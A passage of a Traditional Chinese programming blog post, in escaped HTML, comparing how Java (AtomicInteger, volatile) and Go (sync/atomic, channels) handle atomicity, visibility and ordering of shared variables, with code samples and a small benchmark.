keyword\">static</span> <span class=\"token keyword\">int</span> a<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            a<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span><br>            b<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token operator\">==</span><span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> a<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token class-name\">String</span> err <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%th round, Non thread safe!\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>是很有可能進入進入 12~16 行的 if condition 的，因為對 thread t1 而言 a=2 和 b=1 兩件事沒有 happen-before 關係，所以不會保證順序。</p>\n<p>上面提到的三個 concurrency 問題，其中可見性 (visibility) 和有序性(ordering) 通常一起通稱為 <a href=\"https://en.wikipedia.org/wiki/Happened-before\">happen-before</a> 原則。</p>\n<p>在實作 singleton 模式時常使用 “Double-checked locking” 來優化效能，此時若沒有意識到 happen-before 便會遇到問題：即使 singleton 物件非為 null 也不保證該物件處於初始化完成的狀態，因此有可能會讓系統異常，可參考 wiki 對此異常的<a href=\"https://zh.wikipedia.org/wiki/%E5%8F%8C%E9%87%8D%E6%A3%80%E6%9F%A5%E9%94%81%E5%AE%9A%E6%A8%A1%E5%BC%8F\">描述文章</a>。</p>\n<p>接下來看看 Java 和 Golang 怎麼處理這些問題。</p>\n<h1 id=\"java\"><a class=\"direct-link\" href=\"#java\">#</a> Java</h1>\n<h2 id=\"java-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F\"><a class=\"direct-link\" href=\"#java-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F\">#</a> Java 如何處理原子性？</h2>\n<p>Java 在 java.util.concurrent.atomic 裡面提供了原子性操作相關的 tool kit，用來保證變數的操作。例如可以用 <strong>AtomicInteger</strong> 來處理對共享變數的操作，如此即可保證原子性不被破壞，得到正確的結果，修改過如下</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> times <span class=\"token operator\">=</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Counter</span> counter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Counter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>times<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>            counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">.</span><span class=\"token function\">incrementAndGet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">20000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>counter<span class=\"token punctuation\">.</span>i<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Counter</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">AtomicInteger</span> i <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AtomicInteger</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h2 id=\"java-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F\"><a class=\"direct-link\" href=\"#java-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F\">#</a> Java 如何實作 happen-before？</h2>\n<p>Java 提供了 volatile 關鍵字用來處理 happen before，一但變數在宣告時加上 volatile，對該變數的存取即保證可見性和有序性（注意，原子性不在保證內）。以下便是將開頭講的兩個可見性和有序性的例子，使用 volatile 關鍵字宣告共有變數，便可以保證 happen-before。</p>\n<p>以開頭第二個可見性的例子來說：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">Flag</span> flag <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token comment\">// do nothing</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">Thread</span> t2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>        flag<span class=\"token punctuation\">.</span>bool <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t2<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">.</span>bool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Unreachable\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">static</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Flag</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">boolean</span>  bool <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>當 flag 使參數使用 volatile 修飾後，thread t1 會馬上感知到 thread t2 在第 12 行對 flag 的異動，到 main memory 讀取最新的值，然後逃離迴圈。</p>\n<p>而以有序性的例子來看 volatile：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">private</span> <span class=\"token keyword\">volatile</span> <span class=\"token keyword\">int</span> a<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><br>        <span class=\"token class-name\">Thread</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            a<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span><br>            b<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b<span class=\"token operator\">==</span><span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> a<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token class-name\">String</span> err <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%th round, Non thread safe!\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        t1<span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>加入 a, b 兩個變數加入 volatile 修飾後，即可確保 a 之前的 code 一定會在 a 之前執行，b 之前的 code 一定會在 b 之前執行，因此 thread t1 的 CPU 指令會保證執行順序一定是 a=2, b=1。而對 main thread 而言，就永遠不會看到 b=1, a=0 這種亂序行為了。</p>\n<h1 id=\"golang\"><a class=\"direct-link\" href=\"#golang\">#</a> Golang</h1>\n<h2 id=\"golang-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F\"><a class=\"direct-link\" href=\"#golang-%E5%A6%82%E4%BD%95%E8%99%95%E7%90%86%E5%8E%9F%E5%AD%90%E6%80%A7%EF%BC%9F\">#</a> Golang 如何處理原子性？</h2>\n<p>Golang 也有提供自己的 atomic tool kit，還記得最開頭使用 Lock 的 Golang 範例嗎? 可以改成用 atomic 來處理如下：</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">BenchmarkFib10</span><span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span>testing<span class=\"token punctuation\">.</span>B<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> n <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> n <span class=\"token operator\">&lt;</span> b<span class=\"token punctuation\">.</span>N<span class=\"token punctuation\">;</span> n<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\ta <span class=\"token operator\">:=</span> <span class=\"token function\">int64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t\tatomic<span class=\"token punctuation\">.</span><span class=\"token function\">AddInt64</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>a<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>可以用 atomic 替換掉 Lock，同時達到原子性效果。</p>\n<p>附上兩種寫法的 benchmark:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">BenchmarkLock-8 <span class=\"token number\">9266</span> <span class=\"token number\">134075</span> ns/op <span class=\"token number\">8</span> B/op <span class=\"token number\">1</span> allocs/op  <br>BenchmarkAtomic-8 <span class=\"token number\">19225</span> <span class=\"token number\">62309</span> ns/op <span class=\"token number\">8</span> B/op <span class=\"token number\">1</span> allocs/op</code></pre>\n<p>相較之下可以看到 Lock 的確很吃效能。下圖附上對 atomic 範例的 profiling</p>\n<p><img src=\"/img/posts/genchilu/the-difference-between-java-and-golang-in-writing-concurrent-code-to-access-shared-variable/atomic-profiling.png\" alt=\"\"></p>\n<p>可以看到 cpu 並沒有花太多時間在處理同步上。</p>\n<h2 id=\"golang-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F\"><a class=\"direct-link\" href=\"#golang-%E5%A6%82%E4%BD%95%E5%AF%A6%E4%BD%9C-happen-before%EF%BC%9F\">#</a> Golang 如何實作 happen-before？</h2>\n<p>根據 Golang <a href=\"https://golang.org/ref/mem\">官方 blog</a> 說明了下面幾種情況 Golang 保證 happen before：</p>\n<ul>\n<li>Initialization</li>\n<li>Goroutine creation</li>\n<li>Goroutine destruction</li>\n<li>Channel communication</li>\n<li>Locks</li>\n<li>Once</li>\n</ul>\n<p>但美中不足的是 Golang 並沒有像 Java 的 volatile 可以保證某個變數的 happen before。</p>\n<p>已可見性來說，下面這段 code:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>\tflag <span class=\"token operator\">:=</span> <span class=\"token boolean\">true</span><br><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">for</span> flag <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">continue</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Never end\\n\"</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\tflag <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><br><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">continue</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>第 5~10 行的 goroutine 會卡在無窮迴圈。</p>\n<p>再說有序性，<a href=\"https://golang.org/ref/mem\">官網 blog</a> 即有提到下面這段 code 不是安全的 concurrncy code:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">var</span> a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\ta <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br>\tb <span class=\"token operator\">=</span> <span class=\"token number\">2</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">go</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這段 code 是有可能先 print 2 再 print 0，因此跨 goroutine 的共有變數使用時，若遇到類似上述的 code，務必要用 lock 等有保證 happen before 的機制保護。</p>\n<p>為了確保有序性和可見性，若真需要共享變數還是必須在變數前後用笨重的 Lock 保護。但高效的 Golang 怎麼會用這麼低效的解法？</p>\n<p>在這篇<a href=\"https://blog.golang.org/codelab-share\">官網的 blog</a> 中我們或許可以找到更適合 Golang 的解法。文章中提到</p>\n<blockquote>\n<p>Do not communicate by sharing memory; instead, share memory by communicating.</p>\n</blockquote>\n<p>這也是 Golang 設計 concurrency model 的初衷，使用 <a href=\"https://zh.wikipedia.org/wiki/%E4%BA%A4%E8%AB%87%E5%BE%AA%E5%BA%8F%E7%A8%8B%E5%BC%8F\">CSP model</a>。因此我認為用 channel 來處理可見性和有序性的問題或許是比較 Golang 的做法（如果你還有印象的話，Golang 在 channel 的溝通是有保證 happen-before 的）。</p>\n<p>如可見性範例可以用 chan 在不同的 goroutine 間傳遞 flag 的值：</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>\tdone <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>done <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\tflag <span class=\"token operator\">:=</span> <span class=\"token boolean\">true</span><br>\t\t<span class=\"token keyword\">for</span> flag <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">case</span> flag <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>done<span class=\"token punctuation\">:</span><br>\t\t\t\t<span class=\"token keyword\">break</span><br>\t\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"End of goroutine\\n\"</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\tdone <span class=\"token operator\">&lt;-</span> <span class=\"token boolean\">false</span><br>\t<span class=\"token function\">close</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">continue</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>而有序性範例也可以用 chan 來傳遞 a, b 的值，因此寫起來可能會像下面這段 code</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">var</span> a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>done <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tchana <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><br>\tchanb <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>chana<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>chanb<span class=\"token punctuation\">)</span><br><br>\t\tchana <span class=\"token operator\">&lt;-</span> <span class=\"token number\">1</span><br>\t\tchanb <span class=\"token operator\">&lt;-</span> <span class=\"token number\">2</span><br>\t\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>done<span class=\"token punctuation\">:</span><br>\t\t\t\t<span class=\"token keyword\">return</span><br>\t\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">return</span> chana<span class=\"token punctuation\">,</span> chanb<br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tdone <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\tchana<span class=\"token punctuation\">,</span> chanb <span class=\"token operator\">:=</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br>\ta <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>chana<br>\tb <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>chanb<br>\t<span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h1 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h1>\n<p>撰寫 concurrency 的程式最困難的地方是，很多 bug 都是不確定的，無法複製的，這加大了 debug 的難度。</p>\n<p>深入瞭解 concurrency 的議題，以及你寫的每一行 code 背後是如何運行的，可以很大程度的幫助我們避免做錯事。同時，了解這些可以讓我們更體會語言的設計理念，也能幫助我們更好的撰寫符合該語言特性的安全高效 concurrency 程式。</p>\n",
